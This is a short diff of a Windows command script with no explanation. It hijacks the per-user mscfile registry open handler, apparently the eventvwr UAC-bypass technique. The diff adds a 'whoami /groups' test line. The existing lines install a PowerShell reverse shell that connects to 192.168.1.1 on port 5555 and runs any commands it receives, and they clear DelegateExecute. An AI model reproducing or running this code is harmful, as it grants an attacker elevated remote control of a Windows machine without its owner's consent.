@@ -1,3 +1,7 @@
+REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /d "cmd.exe /k whoami /groups" /f
+
+
+
 REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /d "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('192.168.1.1',5555);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($sb+'> '),0,([text.encoding]::ASCII).GetBytes($sb+'> ').Length);}\"" /f
 
 REG ADD "HKCU\Software\Classes\mscfile\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
